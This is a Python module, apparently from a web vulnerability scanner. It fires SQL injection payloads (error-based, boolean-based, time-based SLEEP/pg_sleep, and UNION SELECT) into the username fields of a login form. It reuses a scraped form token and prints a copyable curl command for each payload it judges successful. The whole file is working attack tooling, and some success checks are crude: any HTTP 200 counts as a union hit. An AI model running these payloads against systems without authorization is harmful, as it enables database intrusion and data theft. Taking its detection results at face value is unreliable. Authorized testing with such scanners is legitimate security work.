# payloads/sqli.py

import requests
import time
from bs4 import BeautifulSoup
from urllib.parse import urlencode

def extract_token(url):
    try:
        res = requests.get(url, timeout=5)
        soup = BeautifulSoup(res.text, "html.parser")
        token_input = soup.find("input", {"name": "user_token"})
        return token_input.get("value") if token_input else ""
    except Exception as e:
        print(f"[sqli] Failed to fetch token: {e}")
        return ""

def test_sqli(form_url, method, input_names):
    print("[sqli] Starting advanced SQLi tests...")

    payloads = {
        "error_based": ["'", "'--", "' OR '1'='1", "\" OR \"1\"=\"1"],
        "boolean_based": ["' OR 1=1 --", "' OR 1=2 --", "' OR 'a'='a", "' OR 'a'='b"],
        "time_based": ["' OR SLEEP(2) --", "' OR pg_sleep(2) --"],
        "union_based": ["' UNION SELECT NULL --", "' UNION SELECT NULL,NULL --", "' UNION SELECT 1,2,3 --"]
    }

    token = extract_token(form_url) if "user_token" in input_names else ""

    for category, tests in payloads.items():
        print(f"[sqli] Running {category.replace('_', '-')} tests...")

        for payload in tests:
            data = {}
            for field in input_names:
                if 'user' in field.lower():
                    data[field] = payload
                elif 'pass' in field.lower():
                    data[field] = "password"
                elif 'token' in field.lower():
                    data[field] = token
                else:
                    data[field] = "test"

            try:
                if method == "post":
                    before = time.time()
                    response = requests.post(form_url, data=data, timeout=10)
                    after = time.time()
                else:
                    response = requests.get(form_url, params=data, timeout=10)
                    before, after = 0, 0

                content = response.text.lower()

                success = False
                if category == "error_based":
                    success = any(err in content for err in ["sql", "syntax", "warning", "mysql", "psql", "mssql"])
                elif category == "boolean_based":
                    success = payload in ["' OR 1=1 --", "' OR 'a'='a"] and response.status_code == 200
                elif category == "time_based":
                    success = after - before > 1.5
                elif category == "union_based":
                    success = "union" in content or response.status_code == 200

                if success:
                    print(f"    ✅ {category.replace('_', ' ').title()} SQLi successful with payload: {payload}")

                    encoded_data = urlencode(data)
                    curl_cmd = f"curl -X {method.upper()} '{form_url}' -d \"{encoded_data}\""
                    print(f"    🔧 Copyable cURL: {curl_cmd}")
                else:
                    print(f"    ❌ Test failed for payload: {payload}")

            except Exception as e:
                print(f"    ⚠️ Error sending payload: {payload} → {e}")
